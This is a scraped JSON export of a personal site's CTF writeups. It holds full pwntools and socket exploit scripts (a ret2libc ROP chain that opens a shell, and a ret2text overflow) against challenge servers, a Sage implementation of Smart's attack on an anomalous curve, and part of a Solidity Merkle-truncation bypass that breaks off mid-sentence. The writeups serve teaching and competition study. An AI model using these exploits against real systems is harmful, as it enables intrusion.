address\nUse buffer overflow to control RIP Build ROP chain to call puts(puts@got) - this leaks the runtime address of puts in libc Return to main to get another chance to exploit Stage 2: Get shell\nCalculate libc base address from the leak Find addresses of system() and \u0026quot;/bin/sh\u0026quot; in libc Build ROP chain to call system(\u0026quot;/bin/sh\u0026quot;) Gathering Information # ROP Gadgets # objdump -M intel -d main | grep -E \u0026#34;(pop|ret)\u0026#34; Found gadgets:\n0x40114a: pop rdi; ret (from useless_gadget) 0x401016: ret (for stack alignment) GOT Addresses # objdump -R main puts@GOT: 0x404000 read@GOT: 0x404008 PLT Addresses # puts@PLT: 0x401030 main: 0x4011e0 Libc Offsets # $ readelf -s libc.so.6 | grep \u0026#34; puts@@\u0026#34; puts@@GLIBC_2.2.5: 0x805a0 $ readelf -s libc.so.6 | grep \u0026#34; system@@\u0026#34; system@@GLIBC_2.2.5: 0x53110 $ strings -a -t x libc.so.6 | grep \u0026#34;/bin/sh\u0026#34; /bin/sh: 0x1a7ea4 Exploit Development # Calculating Offset # Buffer is at rbp-0x40, so:\nPadding to saved RBP: 0x40 bytes Saved RBP: 8 bytes Total offset to return address: 0x48 (72 bytes) Stage 1: Libc Leak # payload1 = b\u0026#39;A\u0026#39; * 0x48 # Fill buffer + saved rbp payload1 += p64(pop_rdi) # ROP: pop rdi; ret payload1 += p64(puts_got) # ROP: puts@GOT as argument payload1 += p64(puts_plt) # ROP: call puts() payload1 += p64(main_addr) # ROP: return to main This calls puts(puts@got), which prints the actual runtime address of puts in libc, then returns to main for stage 2.\nStage 2: Shell Exploitation # # Calculate addresses libc_base = leaked_puts - libc_puts_offset system_addr = libc_base + libc_system_offset bin_sh_addr = libc_base + libc_bin_sh_offset # Build payload payload2 = b\u0026#39;A\u0026#39; * 0x48 # Fill buffer + saved rbp payload2 += p64(ret_gadget) # Stack alignment (important!) payload2 += p64(pop_rdi) # ROP: pop rdi; ret payload2 += p64(bin_sh_addr) # ROP: \u0026#34;/bin/sh\u0026#34; as argument payload2 += p64(system_addr) # ROP: call system() Note: The extra ret gadget is needed for stack alignment. Modern libc requires the stack to be 16-byte aligned when calling functions like system().\nFinal Exploit # #!/usr/bin/env python3 from pwn import * # Configuration elf = ELF(\u0026#39;./main\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) # Addresses pop_rdi = 0x40114a puts_plt = 0x401030 puts_got = 0x404000 main_addr = 0x4011e0 ret_gadget = 0x401016 # Libc offsets libc_puts = 0x805a0 libc_system = 0x53110 libc_bin_sh = 0x1a7ea4 # Connect io = remote(\u0026#39;mojo-pwn.securinets.tn\u0026#39;, 9002) # Stage 1: Leak libc log.info(\u0026#34;Stage 1: Leaking libc address...\u0026#34;) payload1 = b\u0026#39;A\u0026#39; * 0x48 payload1 += p64(pop_rdi) payload1 += p64(puts_got) payload1 += p64(puts_plt) payload1 += p64(main_addr) io.recvuntil(b\u0026#39;Enter your data:\\n\u0026#39;) io.sendline(payload1) leaked_puts = u64(io.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) log.success(f\u0026#34;Leaked puts@libc: {hex(leaked_puts)}\u0026#34;) # Calculate addresses libc_base = leaked_puts - libc_puts system_addr = libc_base + libc_system bin_sh_addr = libc_base + libc_bin_sh log.info(f\u0026#34;system@libc: {hex(system_addr)}\u0026#34;) log.info(f\u0026#34;/bin/sh: {hex(bin_sh_addr)}\u0026#34;) # Stage 2: Get shell log.info(\u0026#34;Stage 2: Calling system(\u0026#39;/bin/sh\u0026#39;)...\u0026#34;) payload2 = b\u0026#39;A\u0026#39; * 0x48 payload2 += p64(ret_gadget) payload2 += p64(pop_rdi) payload2 += p64(bin_sh_addr) payload2 += p64(system_addr) io.recvuntil(b\u0026#39;Enter your data:\\n\u0026#39;) io.sendline(payload2) log.success(\u0026#34;Shell obtained!\u0026#34;) io.interactive() Execution # $ python3 exploit.py [*] Stage 1: Leaking libc address... [+] Leaked puts@libc: 0x7611997685a0 [+] Libc base: 0x7611996e8000 [*] system@libc: 0x76119973b110 [*] /bin/sh: 0x76119988fea4 [*] Stage 2: Calling system(\u0026#39;/bin/sh\u0026#39;)... [+] Shell obtained! $ ls flag.txt ld-linux-x86-64.so.2 libc.so.6 run $ cat flag.txt MOJO-JOJO{r3turn2l1bc_1s_2_34sy} Final Flag # MOJO-JOJO{r3turn2l1bc_1s_2_34sy} Key Takeaways # \u0026ldquo;Useless\u0026rdquo; functions aren\u0026rsquo;t always useless - The useless_gadget function provided the critical pop rdi; ret gadget needed for the attack.\nret2libc is essential when NX is enabled - Can\u0026rsquo;t execute shellcode, so we chain existing code (ROP) to call library functions.\nTwo-stage attacks bypass ASLR - First leak addresses, then use them in the second stage.\nStack alignment matters - Modern x86-64 calling conventions require 16-byte stack alignment. That extra ret gadget ensures proper alignment.\nNo PIE = Easy ROP - Fixed addresses make gadget finding and ROP chain construction much simpler.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/the-archive-whisper/","section":"Writeups","summary":"","title":"The Archive's Whisper - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Warmup\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: A quiet hall.Just Speak, and be heard!!\nConnection: nc mojo-pwn.securinets.tn 9001\nChallenge Overview # We\u0026rsquo;re given a binary executable called main and a remote server to exploit. The challenge hint \u0026ldquo;Just Speak, and be heard!!\u0026rdquo; suggests there\u0026rsquo;s something special about how we need to communicate with the program.\nInitial Analysis # Binary Information # $ file main main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped String Analysis # $ strings main Welcome to the warmup challenge! Enter your input: Good job! cat flag.txt The presence of system function and \u0026ldquo;cat flag.txt\u0026rdquo; string immediately suggests a ret2text attack where we need to redirect execution to a specific address.\nReverse Engineering # Main Function # Disassembling the main function reveals:\n0000000000401228 \u0026lt;main\u0026gt;: 401228: push rbp 401229: mov rbp,rsp ... 401268: call 401186 \u0026lt;vuln\u0026gt; ; Call vulnerable function 40126d: lea rax,[rip+0xdd2] ; Load \u0026#34;cat flag.txt\u0026#34; 401274: mov rdi,rax 401277: call 401040 \u0026lt;system@plt\u0026gt; ; Call system(\u0026#34;cat flag.txt\u0026#34;) 40127c: mov eax,0x0 401281: pop rbp 401282: ret Key Finding: After returning from vuln(), main calls system(\u0026quot;cat flag.txt\u0026quot;) at address 0x40126d.\nVuln Function # The vulnerable function is where the exploitation happens:\n0000000000401186 \u0026lt;vuln\u0026gt;: 401186: push rbp 401187: mov rbp,rsp 40118a: sub rsp,0x50 ; Allocate 80 bytes for buffer ... 4011c0: lea rax,[rbp-0x50] ; Buffer address 4011c4: mov edx,0xc8 ; Read 200 bytes (OVERFLOW!) 4011c9: mov rsi,rax 4011cc: mov edi,0x0 4011d1: call 401060 \u0026lt;read@plt\u0026gt; Vulnerability: Buffer is 80 bytes (rbp-0x50) but reads 200 bytes (0xc8)!\nThe Validation Check # After reading input, there\u0026rsquo;s an interesting validation loop:\n4011d9: mov eax,DWORD PTR [rbp-0x8] ; bytes_read 4011dc: mov edx,0x40 ; 64 4011e1: cmp eax,edx 4011e3: cmovg eax,edx ; check_len = min(bytes_read, 64) 4011e6: mov DWORD PTR [rbp-0xc],eax 4011e9: mov DWORD PTR [rbp-0x4],0x0 ; i = 0 4011f0: jmp 40120e ; Loop body 4011f2: mov eax,DWORD PTR [rbp-0x4] ; i 4011f5: cdqe 4011f7: movzx eax,BYTE PTR [rbp+rax*1-0x50] ; buffer[i] 4011fc: test al,al ; Check if byte is zero 4011fe: je 40120a ; If zero, continue 401200: mov edi,0x1 401205: call 401090 \u0026lt;exit@plt\u0026gt; ; If NON-ZERO, exit! 40120a: add DWORD PTR [rbp-0x4],0x1 ; i++ 40120e: mov eax,DWORD PTR [rbp-0x4] 401211: cmp eax,DWORD PTR [rbp-0xc] 401214: jl 4011f2 ; Loop while i \u0026lt; check_len Critical Discovery: The program checks the first 64 bytes of input and exits if ANY byte is non-zero!\nThis is the opposite of what you\u0026rsquo;d typically expect in a buffer overflow - we need to send null bytes to pass the validation!\nExploitation Strategy # Understanding the Constraints # Buffer starts at rbp-0x50 (80 bytes from saved rbp) Saved rbp is at 8 bytes before return address Total offset to return address: 0x50 + 8 = 88 bytes The validation only checks the first min(bytes_read, 64) bytes Bytes 0-63 must be NULL (0x00) to pass validation Bytes 64-95 can be anything we want! The Exploit # Since we can control bytes after the 64th byte, and the return address is at offset 88:\n[64 null bytes] + [24 filler bytes] + [return address: 0x40126d] The return address 0x40126d points to the instruction that calls system(\u0026quot;cat flag.txt\u0026quot;).\nPayload Structure # Offset 0-63: \\x00 * 64 (Pass validation check) Offset 64-87: \u0026#39;A\u0026#39; * 24 (Filler to reach return address) Offset 88-95: \\x6d\\x12\\x40\\x00\\x00\\x00\\x00\\x00 (Return address, little-endian) Exploit Code # #!/usr/bin/env python3 import socket import struct HOST = \u0026#39;mojo-pwn.securinets.tn\u0026#39; PORT = 9001 # Address where system(\u0026#34;cat flag.txt\u0026#34;) is called system_call_addr = 0x40126d # Calculate offset to return address offset = 0x50 + 8 # 88 bytes # Build payload payload = b\u0026#39;\\x00\u0026#39; * 64 # Pass the null byte check payload += b\u0026#39;A\u0026#39; * (offset - 64) # Fill to return address payload += struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, system_call_addr) # Overwrite return address # Connect and exploit s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(5) s.connect((HOST, PORT)) # Receive prompt data = s.recv(4096) print(data.decode()) # Send payload s.sendall(payload) # Get flag import time time.sleep(0.5) try: s.settimeout(2) while True: data = s.recv(4096) if not data: break print(data.decode(), end=\u0026#39;\u0026#39;) except socket.timeout: pass s.close() Execution # $ python3 exploit.py Welcome to the warmup challenge! Enter your input: Good job! MOJO-JOJO{st4rt1ng_fr0m_z3r0_1s_th3_k3y} Final Flag # MOJO-JOJO{st4rt1ng_fr0m_z3r0_1s_th3_k3y} Key Takeaways # Read the assembly carefully: The validation check was doing the opposite of what you might expect - it required NULL bytes, not printable characters.\nChallenge hint: \u0026ldquo;Just Speak, and be heard!!\u0026rdquo; - Being \u0026ldquo;quiet\u0026rdquo; (sending null/zero bytes) was the key to being \u0026ldquo;heard\u0026rdquo; (getting the flag).\nPartial buffer checks: The validation only checked the first 64 bytes, but we could overflow up to 200 bytes, allowing us to control the return address beyond the checked region.\nThis challenge demonstrates that buffer overflow exploits can have creative twists, and assumptions about input validation can be misleading. Always analyze the exact behavior of checks rather than assuming their purpose.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/warmup/","section":"Writeups","summary":"","title":"Warmup - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/categories/writeups/","section":"Categories","summary":"","title":"Writeups","type":"categories"},{"content":"Step-by-step walkthroughs of CTF challenges I‚Äôve conquered and competitions I‚Äôve crafted.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"Hands-on cybersecurity projects, tools, and experiments I‚Äôve built.\n","date":"4 January 2026","externalUrl":null,"permalink":"/projects/","section":"Projects","summary":"","title":"Projects","type":"projects"},{"content":"","date":"4 January 2026","externalUrl":null,"permalink":"/tags/projects/","section":"Tags","summary":"","title":"Projects","type":"tags"},{"content":"A fully interactive, GUI-style terminal launcher for BlackArch Linux tools, built with bash + fzf.\nBrowse hundreds of BlackArch tools by category, view full package descriptions, install / uninstall / run tools, manage favorites, and launch tools in floating terminals ‚Äî all without memorizing commands.\nDesigned for Hyprland / Wayland users, but works on any Arch-based BlackArch setup.\nShowcase # Here‚Äôs a demo of my project:\nYour browser does not support the video tag. GitHub Link # https://github.com/Deadnaut0/BlackArch-Tools-Manager ‚ú® Features # üìÇ Category-Based Navigation # Automatically loads all BlackArch categories Clean, emoji-enhanced category list No empty or broken categories üîç Search All Tools # Search every BlackArch tool instantly Fuzzy matching powered by fzf ‚≠ê Favorites System # Mark tools as favorites Favorites persist across sessions ‚≠ê icon displayed next to favorite tools Dedicated Favorites category üïò Recent Tools # Automatically tracks recently used tools Quick access to last executed tools üì¶ Install / Uninstall from GUI # Install tools directly via pacman Uninstall cleanly with dependency removal Installed tools detected automatically üß† Full Tool Information # Scrollable full package descriptions Uses pacman -Si Preview pane supports long descriptions üîß Tool Actions Menu # After selecting a tool, choose to: Run in floating terminal Open pre-filled command terminal Install / Uninstall Open tool homepage Add / Remove from favorites üöÄ Run Tools in Floating Terminal # Tools run inside a floating Kitty terminal Terminal stays open after execution Password prompt handled correctly ‚ö° Open Pre-Filled Command Terminal # Opens terminal with:\nsudo toolname Editable before execution\nPerfect for tools with arguments\nüåê Open Tool Homepage # Automatically extracts tool URL Opens in default browser üñ• UI Preview (fzf GUI) # Full-height interface Scrollable previews ANSI colors + icons Keyboard-only workflow No mouse required Feels like a GUI, runs in the terminal.\n‚å® Keybindings # Key Action Enter Select / Confirm Esc Go back ‚Üë ‚Üì Navigate / Fuzzy search Tab Cycle selections Favorites are managed from the Action Menu.\nüìÅ Configuration Files # All user data is stored safely in:\n~/.config/blackarch-tools-script/ File Purpose favorites.conf Favorite tools recent.conf Recently used tools installed_tools.cache Installed tools cache No system files are modified.\nüì¶ Requirements # BlackArch Linux (Arch-based) fzf pacman kitty terminal hyprctl (for floating windows) notify-send Install dependencies # sudo pacman -S fzf kitty libnotify üöÄ Usage # Make the script executable:\nchmod +x blackarch-tool-manager Run it:\n./blackarchtool-manager That\u0026rsquo;s it.\nNo arguments. No config needed.\nüß† Why This Exists # BlackArch has thousands of tools, but:\nNames are hard to remember Categories are fragmented Descriptions are rarely read Running tools closes terminals Favorites don\u0026rsquo;t exist This launcher fixes that.\nüõ° Safety Notes # Uses sudo only when required No background services No telemetry No external APIs Fully local \u0026amp; transparent üß© Customization # You can easily:\nChange terminal (TERM=\u0026quot;kitty\u0026quot;) Add/remove categories Modify floating window size Adjust preview layout Script is cleanly structured and modifiable.\nü§ù Contributing # PRs are welcome:\nNew features Performance improvements UX polish Compatibility fixes üßë‚Äçüíª Author # Created by Deadnaut aka ME\nBuilt for hackers who want speed without losing clarity.\n","date":"4 January 2026","externalUrl":null,"permalink":"/projects/blackarch-tool-manager/","section":"Projects","summary":"","title":"üñ§ BlackArch Tool Manager","type":"projects"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/blockchain/","section":"Tags","summary":"","title":"Blockchain","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/","section":"CTFs","summary":"","title":"CLAWTHEFLAG Qualifications 2025","type":"ctfs"},{"content":"During the ClawTheFlag Qualifications CTF, I solved several challenges across different categories. This section documents how I approached each problem, the mistakes I made, and the techniques that ultimately led to the flag.\nThese writeups are meant both as a personal knowledge base and as a learning resource for anyone interested in CTFs.\nThanks to the Cybears team for fun and educational challenges üêªüé´\n","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/","section":"Writeups","summary":"","title":"CLAWTHEFLAG Qualifications 2025","type":"writeups"},{"content":"Challenge Name: Curved\nCategory: Cryptography\nCTF: ClawTheFlag\nDifficulty: Easy\nDescription: Just An other ecc challenge\nTL;DR # The curve was anomalous: its group order equals the prime field size ($#E(\\mathbb{F}_p) = p$). This enables Smart\u0026rsquo;s attack, letting us solve the ECDLP in linear time, recover Bob\u0026rsquo;s private key, derive the shared secret, and decrypt the flag.\nChallenge Artefacts # Script: server.py (provided) import json import os import hashlib from random import randint from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all import EllipticCurve, GF SECRET_FLAG = b\u0026#39;Cybears{fake_flag}\u0026#39; prime_mod = 98525254601464748798796659245875458879425316953529501999447929215987731776997 coeff_a = 0x1c456bfc3fabba99a737d7fd127eaa9661f7f02e9eb2d461d7398474a93a9b87 coeff_b = 0x8b429f4b9d14ed4307ee460e9f8764a1f276c7e5ce3581d8acd4604c2f0ee7ca curve = EllipticCurve(GF(prime_mod), [coeff_a, coeff_b]) base_point = curve.gens()[0] gx, gy = base_point.xy() def gen_key(): priv = randint(1, curve.order() - 1) pub = base_point * priv return pub, priv def calc_shared(pub_key, priv_key): point = pub_key * priv_key return point.xy()[0] def enc(secret): bob_pub, bob_priv = gen_key() bx, by = bob_pub.xy() alice_pub, alice_priv = gen_key() secret_value = calc_shared(bob_pub, alice_priv) key = hashlib.sha1(str(secret_value).encode()).digest()[:16] iv_bytes = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv_bytes) ciphertext_bytes = cipher.encrypt(pad(secret, 16)) payload = { \u0026#34;iv\u0026#34;: iv_bytes.hex(), \u0026#34;encrypted_flag\u0026#34;: ciphertext_bytes.hex(), \u0026#34;bob_public_key\u0026#34;: {\u0026#34;x\u0026#34;: hex(bx), \u0026#34;y\u0026#34;: hex(by)}, \u0026#34;alice_public_key\u0026#34;: {\u0026#34;x\u0026#34;: hex(alice_pub.xy()[0]), \u0026#34;y\u0026#34;: hex(alice_pub.xy()[1])}, \u0026#34;generator\u0026#34;: {\u0026#34;x\u0026#34;: hex(gx), \u0026#34;y\u0026#34;: hex(gy)} } return json.dumps(payload, indent=4) output_json = enc(SECRET_FLAG) print(output_json) # output # data = { # \u0026#34;iv\u0026#34;: \u0026#34;ee3991136f084b6b54fc03ea87d3309f\u0026#34;, # \u0026#34;encrypted_flag\u0026#34;: \u0026#34;a234a9b4e3140566f365660a6ad70af524d0c57819e8d5d52a80c0964e58583ffed62a06f14ea378ba773c831cb0a65d\u0026#34;, # \u0026#34;bob_public_key\u0026#34;: { # \u0026#34;x\u0026#34;: \u0026#34;0x499fa531c6e4c3726147ed0fd9c6529f1a12f0c783ff90747de9d82299aa20fb\u0026#34;, # \u0026#34;y\u0026#34;: \u0026#34;0x7f05d4fbab1b838661327e03a2077a7b1397038d56d74aae8d49749c393d2ea6\u0026#34; # }, # \u0026#34;alice_public_key\u0026#34;: { # \u0026#34;x\u0026#34;: \u0026#34;0x2404dc8f95e9203581f79188dada1f6738a7caf88d31a540d9e5c37f73d4f0cb\u0026#34;, # \u0026#34;y\u0026#34;: \u0026#34;0x2b3233a83e1ed08cdc55ed47887ac04aa6a24881f03646f12047c6e0e50ec8f6\u0026#34; # }, # \u0026#34;generator\u0026#34;: { # \u0026#34;x\u0026#34;: \u0026#34;0xad474d1a2709090faaf4ebf6ede7cb71c8917c60519ab581818716b9ad5969ae\u0026#34;, # \u0026#34;y\u0026#34;: \u0026#34;0x3fc125df9f61ac41fd36e257e31d0e8d33434ca32127d32ff40a53a41c7ab374\u0026#34; # } # } Output JSON (public info): iv: ee3991136f084b6b54fc03ea87d3309f encrypted_flag: a234...0a65d bob_public_key: (0x499f..., 0x7f05...) alice_public_key: (0x2404..., 0x2b32...) generator: (0xad47..., 0x3fc1...) Understanding the Scheme # Elliptic curve over $\\mathbb{F}_p$ with parameters coeff_a, coeff_b, and generator G. Key exchange: both parties generate ephemeral keys; shared secret is the x-coordinate of alice_priv * bob_pub. AES-CBC encryption uses key = SHA1(shared_x) truncated to 16 bytes; IV is random. Finding the Vulnerability # Compute curve discriminant to ensure non-singular (it is non-singular). Compute group order: order = curve.order(). Observation: order == p. Such curves are called anomalous curves. Anomalous curves are vulnerable to Smart\u0026rsquo;s attack, which reduces ECDLP to a linear-time computation via a p-adic lift. Why Smart\u0026rsquo;s Attack Works # For an anomalous curve, there is an isomorphism from the curve group to $(\\mathbb{Z}/p\\mathbb{Z}, +)$ obtained via a p-adic logarithm. After lifting points to $\\mathbb{Q}_p$, the discrete log n for Q = nP is recovered from p-adic coordinates of pP and pQ. Exploitation Steps # Set up the curve in Sage with the given parameters and public points. Run Smart\u0026rsquo;s attack to solve for Bob\u0026rsquo;s private key k_B from bob_pub = k_B * G. Derive shared secret: S = k_B * alice_pub; use the x-coordinate S.x. Derive AES key: key = SHA1(str(S.x))[:16]. Decrypt the ciphertext with AES-CBC using the provided IV. Key Scripts (high level) # smart_attack.sage: Implements Smart\u0026rsquo;s attack for the anomalous curve, outputs SECRET_VALUE = S.x. decrypt.py: Uses SECRET_VALUE to derive AES key and decrypt the flag. Solver (step-by-step) # Run Smart\u0026rsquo;s attack to recover the shared secret x-coordinate: sage smart_attack.sage from sage.all import * # Given parameters p = 98525254601464748798796659245875458879425316953529501999447929215987731776997 a = 0x1c456bfc3fabba99a737d7fd127eaa9661f7f02e9eb2d461d7398474a93a9b87 b = 0x8b429f4b9d14ed4307ee460e9f8764a1f276c7e5ce3581d8acd4604c2f0ee7ca # Output data gx = int(\u0026#34;0xad474d1a2709090faaf4ebf6ede7cb71c8917c60519ab581818716b9ad5969ae\u0026#34;, 16) gy = int(\u0026#34;0x3fc125df9f61ac41fd36e257e31d0e8d33434ca32127d32ff40a53a41c7ab374\u0026#34;, 16) bob_x = int(\u0026#34;0x499fa531c6e4c3726147ed0fd9c6529f1a12f0c783ff90747de9d82299aa20fb\u0026#34;, 16) bob_y = int(\u0026#34;0x7f05d4fbab1b838661327e03a2077a7b1397038d56d74aae8d49749c393d2ea6\u0026#34;, 16) alice_x = int(\u0026#34;0x2404dc8f95e9203581f79188dada1f6738a7caf88d31a540d9e5c37f73d4f0cb\u0026#34;, 16) alice_y = int(\u0026#34;0x2b3233a83e1ed08cdc55ed47887ac04aa6a24881f03646f12047c6e0e50ec8f6\u0026#34;, 16) # Create curve F = GF(p) E = EllipticCurve(F, [a, b]) G = E(gx, gy) bob_pub = E(bob_x, bob_y) alice_pub = E(alice_x, alice_y) print(f\u0026#34;Curve order: {E.order()}\u0026#34;) print(f\u0026#34;Prime p: {p}\u0026#34;) print(f\u0026#34;Anomalous: {E.order() == p}\u0026#34;) # Smart\u0026#39;s Attack for anomalous curves def smart_attack(P, Q, p): \u0026#34;\u0026#34;\u0026#34; Smart\u0026#39;s attack on anomalous curves. Given P and Q = n*P, returns n. \u0026#34;\u0026#34;\u0026#34; E = P.curve() # Lift curve to Qp (p-adic field) Qp_field = Qp(p, 2) # precision 2 # Get curve coefficients a4 = ZZ(E.a4()) a6 = ZZ(E.a6()) # Create curve over Qp Ep = EllipticCurve(Qp_field, [a4, a6]) # Hensel lift a point from E to Ep def hensel_lift(Pt): x_val = ZZ(Pt.xy()[0]) y_val = ZZ(Pt.xy()[1]) # y^2 = x^3 + a4*x + a6 # We need y\u0026#39; such that y\u0026#39;^2 ‚â° x^3 + a4*x + a6 (mod p^2) # Using Newton\u0026#39;s method: y\u0026#39; = y + t*p where t = (rhs - y^2)/(2*y*p) rhs = x_val^3 + a4 * x_val + a6 # t = (rhs - y_val^2) / (2 * y_val * p) # We need this mod p numerator = (rhs - y_val^2) // p # This should be an integer denominator = 2 * y_val t = ZZ(Mod(numerator, p) * Mod(denominator, p)^(-1)) y_lifted = y_val + t * p return Ep(Qp_field(x_val), Qp_field(y_lifted)) # Lift points P_lift = hensel_lift(P) Q_lift = hensel_lift(Q) # Compute p * P_lift and p * Q_lift pP = p * P_lift pQ = p * Q_lift # Get coordinates x_pP = pP.xy()[0] y_pP = pP.xy()[1] x_pQ = pQ.xy()[0] y_pQ = pQ.xy()[1] # The discrete log is: n = œÜ(Q) / œÜ(P) where œÜ is the p-adic log # For anomalous curves: œÜ(P) = -x(pP) / y(pP) # So n = (x(pQ)/y(pQ)) / (x(pP)/y(pP)) = x(pQ)*y(pP) / (x(pP)*y(pQ)) phi_P = -x_pP / y_pP phi_Q = -x_pQ / y_pQ n = phi_Q / phi_P return ZZ(n) % p print(\u0026#34;\\nRunning Smart\u0026#39;s attack...\u0026#34;) bob_priv = smart_attack(G, bob_pub, p) print(f\u0026#34;Bob\u0026#39;s private key: {bob_priv}\u0026#34;) # Verify if bob_priv * G == bob_pub: print(\u0026#34;Verification: bob_priv * G == bob_pub ‚úì\u0026#34;) else: print(\u0026#34;WARNING: Verification failed!\u0026#34;) # Try negative bob_priv = p - bob_priv if bob_priv * G == bob_pub: print(f\u0026#34;Corrected Bob\u0026#39;s private key: {bob_priv}\u0026#34;) print(\u0026#34;Verification after correction: ‚úì\u0026#34;) # Calculate shared secret shared_point = bob_priv * alice_pub shared_x = ZZ(shared_point.xy()[0]) print(f\u0026#34;\\nShared secret x-coordinate: {shared_x}\u0026#34;) print(f\u0026#34;\\n=== FOR DECRYPTION ===\u0026#34;) print(f\u0026#34;SECRET_VALUE = {shared_x}\u0026#34;) Expected important output:\nBob\u0026#39;s private key: \u0026lt;...\u0026gt; Verification: bob_priv * G == bob_pub ‚úì Shared secret x-coordinate: 70195069208381892934585902848485094050700408152976961917545624632484143189611 === FOR DECRYPTION === SECRET_VALUE = 70195069208381892934585902848485094050700408152976961917545624632484143189611 Decrypt with AES-CBC using that secret: python decrypt.py import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # Data from the challenge iv = bytes.fromhex(\u0026#34;ee3991136f084b6b54fc03ea87d3309f\u0026#34;) encrypted_flag = bytes.fromhex(\u0026#34;a234a9b4e3140566f365660a6ad70af524d0c57819e8d5d52a80c0964e58583ffed62a06f14ea378ba773c831cb0a65d\u0026#34;) # Shared secret x-coordinate from Smart\u0026#39;s attack SECRET_VALUE = 70195069208381892934585902848485094050700408152976961917545624632484143189611 # Derive key (same as in server.py) key = hashlib.sha1(str(SECRET_VALUE).encode()).digest()[:16] # Decrypt cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(encrypted_flag), 16) print(f\u0026#34;FLAG: {plaintext.decode()}\u0026#34;) Expected output:\nFLAG: cybears{...} Math Notes (compact) # Anomalous condition: $#E(\\mathbb{F}_p) = p$. Smart\u0026rsquo;s attack recovers $n$ where $Q = nP$ via $$n \\equiv \\frac{-x(pQ)/y(pQ)}{-x(pP)/y(pP)} \\pmod p.$$ Final Flag # cybears{YOUR_ATTACK_IS_TOO_SMART!!!!} Takeaways # Never use anomalous curves in ECC; they collapse ECDLP hardness. Always validate curve parameters and group order; use standardized safe curves. Do not rely on home-rolled curves without security proofs or standard review. ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/curved/","section":"Writeups","summary":"","title":"Curved - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Cybears Invite\nCategory: Blockchain\nCTF: ClawTheFlag\nDifficulty: Medium Description: Can you get your ticket to enter the finals?\nConnection: nc 13.61.1.167 31337\nTL;DR (Quick Solution) # The challenge uses a Merkle tree verification system with a critical flaw: the Merkle root is truncated to only 4 bytes (bytes4) instead of the standard 32 bytes (bytes32). This reduces the security from 256 bits to just 32 bits.\nThe exploit:\nThe Merkle root is 0xa9059cbb (only 4 bytes) This value equals bytes4(keccak256(\u0026quot;transfer(address,uint256)\u0026quot;)) - the ERC-20 transfer function selector With an empty proof array, the contract checks if bytes4(keccak256(secret)) == merkleRoot Using secret \u0026quot;transfer(address,uint256)\u0026quot; passes the check and mints the NFT Once minted, retrieve the flag using your instance UUID Flag: cybears{4lwAyS_cH3Ck_4RRay_lEnGtHS} (\u0026ldquo;Always check array lengths\u0026rdquo; - a hint about the truncation vulnerability!)\nChallenge Overview # This is a smart contract security challenge where you need to mint a \u0026ldquo;Cybears Finals Invitation\u0026rdquo; NFT by bypassing a Merkle proof verification system.\nWhat you get:\nA netcat endpoint that launches a private Ethereum blockchain instance Source code for several Solidity contracts A funded Ethereum account to interact with the contracts Your goal:\nMint an invitation NFT from the CybearsInvite contract Make Setup.isSolved() return true Retrieve the flag Files provided:\nCybearsInvite.sol ‚Äî Main contract with NFT minting logic and Merkle verification ERC721.sol ‚Äî Minimal ERC-721 NFT implementation MerkleProof.sol ‚Äî Custom (buggy) Merkle proof verification library Setup.sol ‚Äî Deployment contract that checks if challenge is solved Understanding Merkle Trees (Background) # Before diving into the vulnerability, let\u0026rsquo;s understand what Merkle trees are and why they\u0026rsquo;re used:\nWhat\u0026rsquo;s a Merkle Tree?\nA data structure that allows efficient verification of whether an element is part of a set Used in allowlists/whitelists to verify if an address is permitted to mint NFTs Instead of storing thousands of addresses on-chain (expensive!), you store just one 32-byte \u0026ldquo;root\u0026rdquo; hash How it normally works:\nBuild a tree of hashes off-chain from your allowlist Store only the root hash on-chain Users submit a \u0026ldquo;proof\u0026rdquo; (array of hashes) along with their data Contract verifies the proof against the root - if valid, they\u0026rsquo;re on the allowlist Standard security: Merkle roots are bytes32 (32 bytes = 256 bits), making collisions computationally infeasible (2^256 possibilities).\nThe Contracts Explained # Setup.sol (The Challenge Checker) contract Setup { address public immutable PLAYER_ADR; CybearsInvite public immutable cyb; constructor(address _playerAdr, bytes32 merkleRoot) { PLAYER_ADR = _playerAdr; cyb = new CybearsInvite(merkleRoot); } function isSolved() external view returns (bool) { return cyb.balanceOf(PLAYER_ADR) \u0026gt; 0; } } CybearsInvite.sol (The Vulnerable Contract) contract CybearsInvite is ERC721 { bytes4 private _merkleRoot; // ‚ö†Ô∏è ONLY 4 BYTES! Should be bytes32! uint public lastTokenId; mapping(string =\u0026gt; bool) private _minted; constructor(bytes32 _root) ERC721(\u0026#34;Cybears Finals Invitation\u0026#34;, \u0026#34;CybFInv\u0026#34;) { _merkleRoot = bytes4(_root); // ‚ö†Ô∏è Truncates 32 bytes to 4 bytes! } function mintInvite(bytes32[] calldata _proof, string memory secret) public { require(!hasMinted(secret), \u0026#34;Already minted\u0026#34;); require( MerkleProof.verify( _proof, _merkleRoot, bytes4(keccak256(abi.encodePacked(secret))) // ‚ö†Ô∏è Also truncated to 4 bytes ), \u0026#34;Invalid proof, are you sure you are invited?\u0026#34; ); _minted[secret] = true; ++lastTokenId; _mint(msg.sender, lastTokenId); } function hasMinted(string memory secret) public view returns (bool) { return _minted[secret]; } } The Critical Vulnerability:\n_merkleRoot is declared as bytes4 (4 bytes = 